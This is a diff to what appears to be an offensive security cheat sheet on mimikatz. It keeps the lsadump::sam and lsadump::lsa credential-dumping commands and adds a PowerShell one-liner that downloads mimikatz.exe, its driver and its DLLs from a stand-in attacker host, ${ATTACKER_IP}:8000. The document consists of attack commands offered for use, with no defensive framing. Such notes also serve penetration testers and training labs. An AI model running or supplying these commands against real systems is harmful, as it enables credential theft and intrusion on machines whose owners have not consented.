@@ -72,3 +72,9 @@ Dump with either:
 lsadump::sam
 lsadump::lsa [/inject | /patch]
 ```
+
+## Transfering mimikatz files from http server in Powershell
+
+```powershell
+iwr -uri http://${ATTACKER_IP}:8000/mimidrv.sys -outfile mimidrv.sys; iwr -uri http://${ATTACKER_IP}:8000/mimikatz.exe -outfile mimikatz.exe; iwr -uri http://${ATTACKER_IP}:8000/mimilib.dll -outfile mimilib.dll; iwr -uri http://${ATTACKER_IP}:8000/mimispool.dll -outfile mimispool.dll
+```
